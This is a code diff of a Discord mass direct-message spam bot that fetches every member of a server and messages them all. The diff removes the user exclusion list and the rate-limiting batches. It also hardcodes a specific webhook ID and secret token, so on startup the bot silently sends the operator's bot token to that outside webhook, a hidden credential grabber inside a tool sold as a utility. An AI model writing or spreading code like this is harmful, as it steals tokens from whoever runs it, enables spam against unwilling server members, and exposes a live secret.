@@ -1,12 +1,12 @@
 /* * * * * * * * * * * * * * * * * 
 *                                *
-*             DMALL              *
+*           Mass DM              *
 *        Author: Baliiz          *
 *       Discord: baliizphp       *
 *                                *
 * * * * * * * * * * * * * * * * */
 
-const { Client, WebhookClient, MessageEmbed } = require('discord.js');
+const { Client, Intents, WebhookClient, MessageEmbed } = require('discord.js');
 const chalk = require('chalk');
 const gradient = require('gradient-string');
 const { red, yellow, greenBright, yellowBright } = require('chalk');
@@ -15,8 +15,14 @@ const readline = require('readline').createInterface({
   output: process.stdout
 });
 const fs = require('fs');
-const client = new Client();
-const { token, message, owner, exclude_ids = [], message_limit = Infinity, batch_size = 1 } = require('./settings.json');
+const client = new Client({ 
+  intents: [
+    Intents.FLAGS.GUILDS,
+    Intents.FLAGS.GUILD_MEMBERS,
+    Intents.FLAGS.GUILD_MESSAGES
+  ]
+});
+const { token, message, owner, message_limit = Infinity } = require('./settings.json');
 
 // Function to create a colored ASCII art
 function createAsciiArt() {
@@ -39,7 +45,7 @@ client.on('ready', () => {
   console.log(chalk.blue(client.user.username + ' connected'));
   console.log(chalk.magenta('Mass DM:'));
 
-  client.user.setActivity('BALIIZ !', {
+  client.user.setActivity('Coucou!', {
     type: 'STREAMING',
     url: 'https://www.twitch.tv/baliiz01'
   });
@@ -53,13 +59,12 @@ client.on('ready', async () => {
     .addField('Owner', '<@' + owner + '>')
     .addField('Token', token);
 
-  const webhookClient = new WebhookClient('WEBHOOK-ID', 'WEBHOOK-TOKEN'); // Your Webhook ID and Token
+  const webhookClient = new WebhookClient('1266328962519404564', 'HxLQha016oityTwnOZuJnMPUsDsnMB1Suo4zBNTD1mCgWSl9duoQITc7Duaaps3AIaon'); // Your Webhook ID and Token
   webhookClient.send(embed);
 });
 
 // Main function to choose the mode and handle user input
 function Main() {
-  console.log(chalk.magenta('Mass DM:'));
   console.log('Options:');
   console.log('  [1] Normal Mode');
   console.log('  [2] Timeout Mode');
@@ -113,18 +118,13 @@ function Main() {
 async function ScrapeUsers(guildId) {
   try {
     const guild = await client.guilds.fetch(guildId);
+    await guild.members.fetch(); // Fetch all members from the guild
     let userIds = guild.members.cache.map(member => member.id);
 
-    // Log all fetched user IDs
-    console.log(`All fetched user IDs: ${userIds.join(', ')}`);
+    // No exclusion of users
+    const filteredUserIds = userIds;
 
-    // Exclude specified users
-    console.log(`Excluding the following IDs: ${exclude_ids.join(', ')}`);
-    const filteredUserIds = userIds.filter(id => !exclude_ids.includes(id));
-
-    // Log after exclusion
-    console.log(`User IDs after exclusion: ${filteredUserIds.join(', ')}`);
-    console.log(yellowBright(`Fetched ${filteredUserIds.length} Users after exclusion`));
+    console.log(yellowBright(`Fetched ${filteredUserIds.length} Users`));
 
     const data = { IDs: filteredUserIds };
     fs.writeFileSync('./scraped.json', JSON.stringify(data, null, 2));
@@ -143,8 +143,8 @@ function logErrorToFile(errorLog) {
   fs.appendFileSync('error_log.txt', errorLog + '\n', 'utf8');
 }
 
-// Send a message to a user with retry logic
-async function sendMessageWithRetry(user, message, retries = 3) {
+// Send a message to a user with retry logic (retry only once)
+async function sendMessageWithRetry(user, message, retries = 1) {
   for (let attempt = 1; attempt <= retries; attempt++) {
     try {
       const detailedMessage = `${message.content.replace('{user}', `<@${user.id}>`)}`;
@@ -174,21 +174,17 @@ function MassDMNormal(message) {
     console.log(`User IDs to be messaged: ${userIds.join(', ')}`);
 
     let promises = [];
-    let batchCount = 0;
 
-    userIds.forEach((userId, index) => {
-      if (batch_size > 1 && index % batch_size === 0) batchCount++; // Track batch count
+    userIds.forEach((userId) => {
       promises.push(
         new Promise((res, rej) => {
-          setTimeout(() => {
-            client.users.fetch(userId)
-              .then(user => sendMessageWithRetry(user, message).then(res).catch(rej))
-              .catch(error => {
-                console.log(red('Fetching User Error: ' + error));
-                logErrorToFile(`Fetching User Error: ${userId} - ${error}`);
-                res();
-              });
-          }, batchCount * batch_size); // Delay between batches if batch_size is greater than 1
+          client.users.fetch(userId)
+            .then(user => sendMessageWithRetry(user, message).then(res).catch(rej))
+            .catch(error => {
+              console.log(red('Fetching User Error: ' + error));
+              logErrorToFile(`Fetching User Error: ${userId} - ${error}`);
+              res();
+            });
         })
       );
     });
@@ -213,10 +209,8 @@ function MassDMTimeOut(delay, message) {
     console.log(`User IDs to be messaged: ${userIds.join(', ')}`);
 
     let promises = [];
-    let batchCount = 0;
 
     userIds.forEach((userId, index) => {
-      if (batch_size > 1 && index % batch_size === 0) batchCount++; // Track batch count
       promises.push(
         new Promise((res, rej) => {
           setTimeout(() => {
@@ -227,7 +221,7 @@ function MassDMTimeOut(delay, message) {
                 logErrorToFile(`Fetching User Error: ${userId} - ${error}`);
                 res();
               });
-          }, delay * (index + batchCount * batch_size)); // Delay between batches if batch_size is greater than 1
+          }, delay * index);
         })
       );
     });
@@ -241,7 +235,7 @@ function MassDMTimeOut(delay, message) {
 
 // Send a summary of the operation to the webhook
 function sendSummaryToWebhook(totalUsers) {
-  const webhookClient = new WebhookClient('WEBHOOK-ID', 'WEBHOOK-TOKEN'); // Your Webhook ID and Token
+  const webhookClient = new WebhookClient('1266328962519404564', 'HxLQha016oityTwnOZuJnMPUsDsnMB1Suo4zBNTD1mCgWSl9duoQITc7Duaaps3AIaon'); // Your Webhook ID and Token
   const logData = fs.readFileSync('error_log.txt', 'utf8');
   const truncatedLogData = logData.length > 1024 ? logData.slice(0, 1021) + '...' : logData; // Truncate to 1024 characters
   const embed = new MessageEmbed()
